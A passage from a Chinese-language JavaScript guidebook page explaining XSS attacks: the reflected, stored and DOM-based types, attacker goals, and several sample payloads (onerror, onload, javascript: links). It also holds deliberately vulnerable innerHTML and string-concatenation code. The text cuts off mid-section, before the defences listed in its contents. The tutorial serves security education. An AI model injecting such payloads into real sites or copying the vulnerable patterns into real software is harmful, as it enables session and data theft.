<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no"
    />
    <link rel="shortcut icon" type="image/x-icon" href="./favicon.ico" />
    <link
      rel="stylesheet"
      href="/black-javascript-guidebook/umi.c1e1dfc3.css"
    />
    <script>
      window.routerBase = "/black-javascript-guidebook/";
    </script>
    <script>
      //! umi version: 3.5.41
    </script>
    <script>
      !(function () {
        var e =
            navigator.cookieEnabled && void 0 !== window.localStorage
              ? localStorage.getItem("dumi:prefers-color")
              : "auto",
          o = window.matchMedia("(prefers-color-scheme: dark)").matches,
          t = ["light", "dark", "auto"];
        document.documentElement.setAttribute(
          "data-prefers-color",
          e === t[2] ? (o ? t[1] : t[0]) : t.indexOf(e) > -1 ? e : t[0]
        );
      })();
    </script>
    <title>XSS 跨站脚本攻击 - JavaScript Guidebook</title>
  </head>
  <body>
    <div id="root"><div class="__dumi-default-layout" data-route="/computer-networks/web-security/xss" data-show-sidemenu="true" data-show-slugs="true" data-site-mode="true" data-gapless="false"><div class="__dumi-default-navbar" data-mode="site"><button class="__dumi-default-navbar-toggle"></button><a class="__dumi-default-navbar-logo" style="background-image:url(&#x27;http://img.mrsingsing.com/javascript-guidebook-favicon.png&#x27;)" href="/black-javascript-guidebook//">JavaScript Guidebook</a><nav><div class="__dumi-default-search"><input type="search" class="__dumi-default-search-input" value=""/><ul></ul></div><span><a href="/black-javascript-guidebook//basic-concept">基本语法</a></span><span><a href="/black-javascript-guidebook//standard-built-in-objects">内置对象</a></span><span><a href="/black-javascript-guidebook//core-modules">核心模块</a></span><span><a href="/black-javascript-guidebook//object-oriented-programming">OOP</a></span><span><a href="/black-javascript-guidebook//browser-object-model">BOM</a></span><span><a href="/black-javascript-guidebook//document-object-model">DOM</a></span><span><a aria-current="page" class="active" href="/black-javascript-guidebook//computer-networks">计算机网络</a></span><span><a href="/black-javascript-guidebook//design-patterns">设计模式</a></span><span><a target="_blank" rel="noopener noreferrer" href="https://github.com/yyt520/black-javascript-guidebook">Github<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="__dumi-default-external-link-icon"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></span><div class="__dumi-default-navbar-tool"><div class="__dumi-default-dark"><div class="__dumi-default-dark-switch "></div></div></div></nav></div><div class="__dumi-default-menu" data-mode="site"><div class="__dumi-default-menu-inner"><div class="__dumi-default-menu-header"><a class="__dumi-default-menu-logo" style="background-image:url(&#x27;http://img.mrsingsing.com/javascript-guidebook-favicon.png&#x27;)" href="/black-javascript-guidebook//"></a><h1>JavaScript Guidebook</h1><p>JavaScript 完全知识体系</p></div><div class="__dumi-default-menu-mobile-area"><ul class="__dumi-default-menu-nav-list"><li><a href="/black-javascript-guidebook//basic-concept">基本语法</a></li><li><a href="/black-javascript-guidebook//standard-built-in-objects">内置对象</a></li><li><a href="/black-javascript-guidebook//core-modules">核心模块</a></li><li><a href="/black-javascript-guidebook//object-oriented-programming">OOP</a></li><li><a href="/black-javascript-guidebook//browser-object-model">BOM</a></li><li><a href="/black-javascript-guidebook//document-object-model">DOM</a></li><li><a aria-current="page" class="active" href="/black-javascript-guidebook//computer-networks">计算机网络</a></li><li><a href="/black-javascript-guidebook//design-patterns">设计模式</a></li><li><a target="_blank" rel="noopener noreferrer" href="https://github.com/yyt520/black-javascript-guidebook">Github<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="__dumi-default-external-link-icon"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul><div class="__dumi-default-dark"><div class="__dumi-default-dark-switch "><button title="Dark theme" class="__dumi-default-dark-moon "><svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="3854" width="22" height="22"><path d="M991.816611 674.909091a69.166545 69.166545 0 0 0-51.665455-23.272727 70.795636 70.795636 0 0 0-27.438545 5.585454A415.674182 415.674182 0 0 1 754.993338 698.181818c-209.594182 0-393.472-184.785455-393.472-395.636363 0-52.363636 38.539636-119.621818 69.515637-173.614546 4.887273-8.610909 9.634909-16.756364 14.103272-24.901818A69.818182 69.818182 0 0 0 384.631156 0a70.842182 70.842182 0 0 0-27.438545 5.585455C161.678429 90.298182 14.362065 307.898182 14.362065 512c0 282.298182 238.824727 512 532.38691 512a522.286545 522.286545 0 0 0 453.957818-268.334545A69.818182 69.818182 0 0 0 991.816611 674.909091zM546.679156 954.181818c-248.785455 0-462.941091-192-462.941091-442.181818 0-186.647273 140.637091-372.829091 300.939637-442.181818-36.817455 65.629091-92.578909 151.970909-92.578909 232.727273 0 250.181818 214.109091 465.454545 462.917818 465.454545a488.331636 488.331636 0 0 0 185.181091-46.545455 453.003636 453.003636 0 0 1-393.565091 232.727273z m103.656728-669.323636l-14.266182 83.781818a34.909091 34.909091 0 0 0 50.362182 36.770909l74.775272-39.563636 74.752 39.563636a36.142545 36.142545 0 0 0 16.174546 3.956364 34.909091 34.909091 0 0 0 34.210909-40.727273l-14.289455-83.781818 60.509091-59.345455a35.025455 35.025455 0 0 0-19.223272-59.578182l-83.61891-12.101818-37.376-76.101818a34.56 34.56 0 0 0-62.254545 0l-37.376 76.101818-83.618909 12.101818a34.909091 34.909091 0 0 0-19.246546 59.578182z m70.423272-64.698182a34.280727 34.280727 0 0 0 26.135273-19.083636l14.312727-29.090909 14.336 29.090909a34.257455 34.257455 0 0 0 26.135273 19.083636l32.046546 4.887273-23.272728 22.574545a35.234909 35.234909 0 0 0-10.007272 30.952727l5.46909 32.116364-28.625454-15.127273a34.490182 34.490182 0 0 0-32.302546 0l-28.695272 15.127273 5.469091-32.116364a35.141818 35.141818 0 0 0-9.984-30.952727l-23.272728-22.574545z" p-id="3855"></path></svg></button><button title="Light theme" class="__dumi-default-dark-sun "><svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4026" width="22" height="22"><path d="M915.2 476.16h-43.968c-24.704 0-44.736 16-44.736 35.84s20.032 35.904 44.736 35.904H915.2c24.768 0 44.8-16.064 44.8-35.904s-20.032-35.84-44.8-35.84zM512 265.6c-136.704 0-246.464 109.824-246.464 246.4 0 136.704 109.76 246.464 246.464 246.464S758.4 648.704 758.4 512c0-136.576-109.696-246.4-246.4-246.4z m0 425.6c-99.008 0-179.2-80.128-179.2-179.2 0-98.944 80.192-179.2 179.2-179.2S691.2 413.056 691.2 512c0 99.072-80.192 179.2-179.2 179.2zM197.44 512c0-19.84-19.136-35.84-43.904-35.84H108.8c-24.768 0-44.8 16-44.8 35.84s20.032 35.904 44.8 35.904h44.736c24.768 0 43.904-16.064 43.904-35.904zM512 198.464c19.776 0 35.84-20.032 35.84-44.8v-44.8C547.84 84.032 531.84 64 512 64s-35.904 20.032-35.904 44.8v44.8c0 24.768 16.128 44.864 35.904 44.864z m0 627.136c-19.776 0-35.904 20.032-35.904 44.8v44.736C476.096 940.032 492.16 960 512 960s35.84-20.032 35.84-44.8v-44.736c0-24.768-16.064-44.864-35.84-44.864z m329.92-592.832c17.472-17.536 20.288-43.072 6.4-57.024-14.016-14.016-39.488-11.2-57.024 6.336-4.736 4.864-26.496 26.496-31.36 31.36-17.472 17.472-20.288 43.008-6.336 57.024 13.952 14.016 39.488 11.2 57.024-6.336 4.8-4.864 26.496-26.56 31.296-31.36zM213.376 759.936c-4.864 4.8-26.56 26.624-31.36 31.36-17.472 17.472-20.288 42.944-6.4 56.96 14.016 13.952 39.552 11.2 57.024-6.336 4.8-4.736 26.56-26.496 31.36-31.36 17.472-17.472 20.288-43.008 6.336-56.96-14.016-13.952-39.552-11.072-56.96 6.336z m19.328-577.92c-17.536-17.536-43.008-20.352-57.024-6.336-14.08 14.016-11.136 39.488 6.336 57.024 4.864 4.864 26.496 26.56 31.36 31.424 17.536 17.408 43.008 20.288 56.96 6.336 14.016-14.016 11.264-39.488-6.336-57.024-4.736-4.864-26.496-26.56-31.296-31.424z m527.168 628.608c4.864 4.864 26.624 26.624 31.36 31.424 17.536 17.408 43.072 20.224 57.088 6.336 13.952-14.016 11.072-39.552-6.4-57.024-4.864-4.8-26.56-26.496-31.36-31.36-17.472-17.408-43.072-20.288-57.024-6.336-13.952 14.016-11.008 39.488 6.336 56.96z" p-id="4027"></path></svg></button><button title="Default to system" class="__dumi-default-dark-auto "><svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="11002" width="22" height="22"><path d="M127.658667 492.885333c0-51.882667 10.24-101.717333 30.378666-149.162666s47.786667-88.064 81.92-122.538667 75.093333-61.781333 122.538667-81.92 96.938667-30.378667 149.162667-30.378667 101.717333 10.24 149.162666 30.378667 88.405333 47.786667 122.88 81.92 61.781333 75.093333 81.92 122.538667 30.378667 96.938667 30.378667 149.162666-10.24 101.717333-30.378667 149.162667-47.786667 88.405333-81.92 122.88-75.093333 61.781333-122.88 81.92-97.28 30.378667-149.162666 30.378667-101.717333-10.24-149.162667-30.378667-88.064-47.786667-122.538667-81.92-61.781333-75.093333-81.92-122.88-30.378667-96.938667-30.378666-149.162667z m329.045333 0c0 130.048 13.994667 244.394667 41.984 343.381334h12.970667c46.762667 0 91.136-9.216 133.461333-27.306667s78.848-42.666667 109.568-73.386667 54.954667-67.242667 73.386667-109.568 27.306667-86.698667 27.306666-133.461333c0-46.421333-9.216-90.794667-27.306666-133.12s-42.666667-78.848-73.386667-109.568-67.242667-54.954667-109.568-73.386667-86.698667-27.306667-133.461333-27.306666h-11.605334c-28.672 123.562667-43.349333 237.909333-43.349333 343.722666z" p-id="11003"></path></svg></button></div></div></div><ul class="__dumi-default-menu-list"><li><a href="/black-javascript-guidebook//computer-networks">计算机网络</a></li><li><a target="_blank" rel="noopener noreferrer">计算机网络体系</a><ul><li><a href="/black-javascript-guidebook//computer-networks/computer-network-architecture/computer-networks"><span>计算机网络体系</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/computer-network-architecture/transport-layer-protocol"><span>传输层协议</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/computer-network-architecture/network-layer-and-data-link-layer-protocol"><span>网络层与数据链路层协议</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/computer-network-architecture/dns"><span>DNS 域名解析系统</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/computer-network-architecture/cdn"><span>CDN 内容分发网络</span></a></li></ul></li><li><a target="_blank" rel="noopener noreferrer">HTTP</a><ul><li><a href="/black-javascript-guidebook//computer-networks/http/http"><span>HTTP</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/http/http-resource-and-uris"><span>HTTP 资源标识</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/http/http-message"><span>HTTP 报文格式</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/http/http-headers"><span>HTTP 首部字段</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/http/http-status-code"><span>HTTP 状态码</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/http/http-connection"><span>HTTP 连接</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/http/http-content-negotiation"><span>HTTP 内容协商</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/http/cross-origin-resource-sharing"><span>HTTP CORS 跨域资源共享</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/http/content-security-policy"><span>HTTP CSP 内容安全策略</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/http/https"><span>HTTPS</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/http/http2"><span>HTTP2</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/http/http3"><span>HTTP3</span></a></li></ul></li><li><a target="_blank" rel="noopener noreferrer">Web 安全</a><ul><li><a href="/black-javascript-guidebook//computer-networks/web-security/same-origin-policy"><span>同源策略</span></a></li><li><a aria-current="page" class="active" href="/black-javascript-guidebook//computer-networks/web-security/xss"><span>XSS 跨站脚本攻击</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/web-security/csrf"><span>CSRF 跨站请求伪造攻击</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/web-security/ddos"><span>DDoS 攻击</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/web-security/sql-injection"><span>SQL 注入攻击</span></a></li><li><a href="/black-javascript-guidebook//computer-networks/web-security/hijacking"><span>流量劫持</span></a></li></ul></li><li><a href="/black-javascript-guidebook//computer-networks/computer-network-architecture">计算机网络体系</a><ul><li><a href="/black-javascript-guidebook//computer-networks/computer-network-architecture/hls"><span>HLS 流媒体网络传输协议</span></a></li></ul></li></ul></div></div><ul role="slug-list" class="__dumi-default-layout-toc"><li title="攻击种类" data-depth="2"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#攻击种类"><span>攻击种类</span></a></li><li title="反射型" data-depth="3"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#反射型"><span>反射型</span></a></li><li title="存储型" data-depth="3"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#存储型"><span>存储型</span></a></li><li title="DOM Based 型" data-depth="3"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#dom-based-型"><span>DOM Based 型</span></a></li><li title="攻击手段" data-depth="2"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#攻击手段"><span>攻击手段</span></a></li><li title="标签拼接漏洞" data-depth="3"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#标签拼接漏洞"><span>标签拼接漏洞</span></a></li><li title="提前闭合标签" data-depth="3"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#提前闭合标签"><span>提前闭合标签</span></a></li><li title="合法 HTML 转义漏洞" data-depth="3"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#合法-html-转义漏洞"><span>合法 HTML 转义漏洞</span></a></li><li title="合法 JS 转义漏洞" data-depth="3"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#合法-js-转义漏洞"><span>合法 JS 转义漏洞</span></a></li><li title="方法总结" data-depth="3"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#方法总结"><span>方法总结</span></a></li><li title="防御策略" data-depth="2"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#防御策略"><span>防御策略</span></a></li><li title="输入过滤" data-depth="3"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#输入过滤"><span>输入过滤</span></a></li><li title="纯前端渲染" data-depth="3"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#纯前端渲染"><span>纯前端渲染</span></a></li><li title="转义 HTML" data-depth="3"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#转义-html"><span>转义 HTML</span></a></li><li title="禁止执行不可信数据" data-depth="3"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#禁止执行不可信数据"><span>禁止执行不可信数据</span></a></li><li title="內容安全策略" data-depth="3"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#內容安全策略"><span>內容安全策略</span></a></li><li title="HTTPOnly Cookie" data-depth="3"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#httponly-cookie"><span>HTTPOnly Cookie</span></a></li><li title="参考资料" data-depth="2"><a href="/black-javascript-guidebook//computer-networks/web-security/xss#参考资料"><span>参考资料</span></a></li></ul><div class="__dumi-default-layout-content"><div class="markdown"><h1 id="xss-跨站脚本攻击"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#xss-跨站脚本攻击"><span class="icon icon-link"></span></a>XSS 跨站脚本攻击</h1><p>XSS 攻击全称 <strong>跨站脚本攻击</strong>（Cross-Site Scripting），是一种代码注入攻击。</p><ul><li>攻击方法：攻击者利用网页开发时留下的漏洞，通过巧妙的方法在目标网站 HTML 页面中注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</li><li>本质：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。</li></ul><h2 id="攻击种类"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#攻击种类"><span class="icon icon-link"></span></a>攻击种类</h2><p>根据攻击的来源，XSS 攻击可分为 <strong>反射型</strong>、<strong>存储型</strong> 和 <strong>DOM-Based 型</strong>三种。</p><div class="__dumi-default-table"><div class="__dumi-default-table-content"><table><thead><tr><th align="left">类型</th><th align="left">存储区</th><th align="left">插入点</th></tr></thead><tbody><tr><td align="left">反射型</td><td align="left">URL</td><td align="left">HTML</td></tr><tr><td align="left">存储型</td><td align="left">服务端数据库</td><td align="left">HTML</td></tr><tr><td align="left">DOM-Based 型</td><td align="left">服务端数据库 / 客户端存储 / URL</td><td align="left">前端 JavaScript</td></tr></tbody></table></div></div><p>名词说明：</p><ul><li><strong>存储区</strong>：恶意代码存放的位置</li><li><strong>插入点</strong>：由谁取得恶意代码，并插入到网页上</li></ul><h3 id="反射型"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#反射型"><span class="icon icon-link"></span></a>反射型</h3><p>反射型 XSS 攻击又称为<strong>非持久性跨站点脚本攻击</strong>，这种攻击类型通过诱导用户点击恶意链接来造成一次性攻击。</p><p><strong>攻击方式</strong>：漏洞产生的原因是攻击者 <strong style="color:red">注入的数据反映在请求响应</strong> 中。用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户浏览器执行，从而达到攻击目的。通过 URL 参数直接注入，然后在响应的数据中包含着危险的代码。</p><p>攻击步骤：</p><ol><li>攻击者把带有恶意脚本代码参数的 URL 地址发送给用户</li><li>用户点击此链接</li><li>服务器端获取请求参数并且直接使用，服务器反射回结果页面</li></ol><p>说明：</p><ul><li>反射型 XSS 攻击是一次性的，必须要通过用户点击链接才能发起</li><li>一些浏览器如 Chrome 其内置了一些 XSS 过滤器，可以防止大部分反射型 XSS 攻击</li><li>反射型 XSS 其实就是服务器没有对恶意的用户输入进行安全处理就直接反射响应内容，导致恶意代码在浏览器中执行的一种 XSS 漏洞</li></ul><p>攻击示例：</p><div class="__dumi-default-code-block"><pre class="prism-code language-html"><button class="__dumi-default-icon __dumi-default-code-block-copy-btn" data-status="ready"></button><div class="token-line"><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag attr-name">id</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">root</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">script</span><span class="token tag"> </span><span class="token tag attr-name">type</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">application/javascript</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">  </span><span class="token script language-javascript comment">// 假设这是请求返回的数据</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">  </span><span class="token script language-javascript keyword">const</span><span class="token script language-javascript"> res </span><span class="token script language-javascript operator">=</span><span class="token script language-javascript"> </span><span class="token script language-javascript punctuation">[</span><span class="token script language-javascript string">&#x27;1&#x27;</span><span class="token script language-javascript punctuation">,</span><span class="token script language-javascript"> </span><span class="token script language-javascript string">&#x27;2&#x27;</span><span class="token script language-javascript punctuation">,</span><span class="token script language-javascript"> </span><span class="token script language-javascript string">&#x27;3&#x27;</span><span class="token script language-javascript punctuation">,</span><span class="token script language-javascript"> </span><span class="token script language-javascript string">&#x27;&lt;img src=&quot;1&quot; onerror=&quot;console.log(windwo.localStorage)&quot; /&gt;&#x27;</span><span class="token script language-javascript punctuation">]</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">
</span></div><div class="token-line"><span class="token script language-javascript">  </span><span class="token script language-javascript keyword">const</span><span class="token script language-javascript"> root </span><span class="token script language-javascript operator">=</span><span class="token script language-javascript"> </span><span class="token script language-javascript dom variable">document</span><span class="token script language-javascript punctuation">.</span><span class="token script language-javascript method function property-access">querySelector</span><span class="token script language-javascript punctuation">(</span><span class="token script language-javascript string">&#x27;#root&#x27;</span><span class="token script language-javascript punctuation">)</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">
</span></div><div class="token-line"><span class="token script language-javascript">  res</span><span class="token script language-javascript punctuation">.</span><span class="token script language-javascript method function property-access">forEach</span><span class="token script language-javascript punctuation">(</span><span class="token script language-javascript punctuation">(</span><span class="token script language-javascript parameter">item</span><span class="token script language-javascript punctuation">)</span><span class="token script language-javascript"> </span><span class="token script language-javascript arrow operator">=&gt;</span><span class="token script language-javascript"> </span><span class="token script language-javascript punctuation">{</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">    </span><span class="token script language-javascript keyword">const</span><span class="token script language-javascript"> p </span><span class="token script language-javascript operator">=</span><span class="token script language-javascript"> </span><span class="token script language-javascript dom variable">document</span><span class="token script language-javascript punctuation">.</span><span class="token script language-javascript method function property-access">createElement</span><span class="token script language-javascript punctuation">(</span><span class="token script language-javascript string">&#x27;p&#x27;</span><span class="token script language-javascript punctuation">)</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">    p</span><span class="token script language-javascript punctuation">.</span><span class="token script language-javascript property-access">innerHTML</span><span class="token script language-javascript"> </span><span class="token script language-javascript operator">=</span><span class="token script language-javascript"> item</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">    root</span><span class="token script language-javascript punctuation">.</span><span class="token script language-javascript method function property-access">append</span><span class="token script language-javascript punctuation">(</span><span class="token script language-javascript">p</span><span class="token script language-javascript punctuation">)</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">  </span><span class="token script language-javascript punctuation">}</span><span class="token script language-javascript punctuation">)</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript"></span><span class="token tag punctuation">&lt;/</span><span class="token tag">script</span><span class="token tag punctuation">&gt;</span></div></pre></div><p>当数据返回后，<code>&lt;img&gt;</code> 标签会注入 HTML DOM 文档中，又因为 <code>src</code> 属性为无效的 URL 值，所以触发了 <code>onerror</code> 事件，从而执行了 <code>onerror</code> 定义的函数，这样便获取到了存储在客户端本地的 <code>localStorage</code> 信息。</p><blockquote><p>🤼‍♂️ <strong>反射型 XSS 跟存储型 XSS 的区别是？</strong></p><ul><li>反射型 XSS 漏洞常见于 <strong style="color:red">通过 URL 传递参数</strong> 的功能，如网站搜索、跳转等。</li><li>存储型 XSS 的恶意代码 <strong style="color:red">存在数据库</strong> 里，反射型 XSS 的恶意代码存在 URL 里。</li></ul><p>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p></blockquote><p>POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p><h3 id="存储型"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#存储型"><span class="icon icon-link"></span></a>存储型</h3><p>存储型 XSS 攻击又称为<strong>持久性跨站点脚本攻击</strong>，通常攻击者将代码存储到漏洞服务器中，用户浏览相关页面发起攻击。</p><p>攻击步骤：</p><ol><li>攻击者将恶意脚本代码上传或存储到漏洞服务器</li><li>服务器把恶意脚本保存到服务器</li><li>当正常客户访问服务器时，服务器会读取恶意数据并且直接使用</li><li>服务器会返回含有恶意脚本的页面</li></ol><p>实际案例：</p><ul><li>譬如发帖中发出包含恶意代码的内容，其他内容访问到该内容后，满足特定条件后条件即触发</li><li>需要后台不过滤信息，并且前端展示时也不过滤信息</li></ul><p><strong>注意</strong>：这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p><p>修复：服务端一般不会轻易对大量已存数据再编辑。需要对新写入数据修正存储逻辑。前端做好正确的 <strong>编码转义</strong>。</p><div class="__dumi-default-table"><div class="__dumi-default-table-content"><table><thead><tr><th align="left">类型</th><th align="left">反射型</th><th align="left">存储型</th></tr></thead><tbody><tr><td align="left">持久性</td><td align="left">非持久</td><td align="left">持久化（存储在服务器）</td></tr><tr><td align="left">触发时机</td><td align="left">需要用户点击</td><td align="left">不需要用户交互也可以触发</td></tr><tr><td align="left">危害</td><td align="left">危害较小</td><td align="left">危害更大</td></tr></tbody></table></div></div><h3 id="dom-based-型"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#dom-based-型"><span class="icon icon-link"></span></a>DOM Based 型</h3><p>DOM Based 型 XSS，这种攻击类型不需要服务器端支持，是由于 DOM 结构修改导致的，基于浏览器 DOM 解析的攻击</p><p>攻击步骤：</p><ol><li>用户打开带有恶意的链接</li><li>浏览器在 DOM 解析的时候直接使用恶意数据</li><li>用户中招</li><li>常见的触发场景就是在修改 <code>innerHTML</code>、<code>outerHTML</code>、<code>document.write</code> 的时候</li></ol><p>实际案例：</p><ul><li>譬如 Wifi 浏览器劫持、DNS 劫持，并直接返回钓鱼页面</li><li>本质是需要更改 DOM，再排除自己攻击自己，所以这里单独拿流量劫持举例。严格来说某些反射型的攻击也能造成这个后果-通过 URL 控制 DOM。</li></ul><p>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p><h2 id="攻击手段"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#攻击手段"><span class="icon icon-link"></span></a>攻击手段</h2><p>攻击手段：</p><ul><li>获取页面的数据，如 DOM、Cookie、LocalStorage</li><li>破坏页面结构</li><li>流量劫持</li><li>挂马</li><li>盗取用户 Cookie</li><li>DDOS（拒绝服务）客户端浏览器</li><li>钓鱼工具，高级的钓鱼技巧</li><li>删除用户文章、恶意篡改数据、嫁祸</li><li>劫持用户 Web 行为，甚至进一步渗透内网</li><li>爆发 Web2.0 蠕虫</li><li>蠕虫式 DDoS 攻击</li><li>蠕虫式挂马攻击、刷广告、刷流量、破坏网上数据</li></ul><p>常见有效荷载（Payload）：</p><ul><li><code>&lt;input onfocus=write(&#x27;xss&#x27;) autofocus&gt;</code></li><li><code>&lt;img src onerror=alert(&#x27;xss&#x27;)&gt;</code></li><li><code>&lt;svg onload=alert(&#x27;xss&#x27;) &gt;</code></li><li><code>&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</code></li><li><code>&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;)&quot;&gt;clickme&lt;/a&gt;</code></li></ul><blockquote><p>XSS 荷载（XSS Payload）是指恶意植入且具有完成各种具体功能的恶意脚本。</p></blockquote><h3 id="标签拼接漏洞"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#标签拼接漏洞"><span class="icon icon-link"></span></a>标签拼接漏洞</h3><p>服务端渲染代码：这里的 <code>input</code> 可能是客户端传递到服务端的数据</p><div class="__dumi-default-code-block"><pre class="prism-code language-js"><button class="__dumi-default-icon __dumi-default-code-block-copy-btn" data-status="ready"></button><div class="token-line"><span class="token comment">// Server Code</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token keyword">function</span><span class="token plain"> </span><span class="token function">serverRender</span><span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">  </span><span class="token keyword control-flow">return</span><span class="token plain"> </span><span class="token string">&#x27;&lt;div&gt;&#x27;</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> input </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string">&#x27;&lt;/div&#x27;</span><span class="token operator">&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token punctuation">}</span></div></pre></div><p>攻击方法：破坏原来的 HTML 代码结构，让你写的代码生效</p><p>输入渲染的 <code>input</code> 变量为 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>输出渲染的 HTML 结构：<code>&lt;div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt;</code></p><p>这样你脚本内的 <code>alert(1)</code> 函数返回到前端渲染时就会被自动执行。</p><h3 id="提前闭合标签"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#提前闭合标签"><span class="icon icon-link"></span></a>提前闭合标签</h3><p>对于 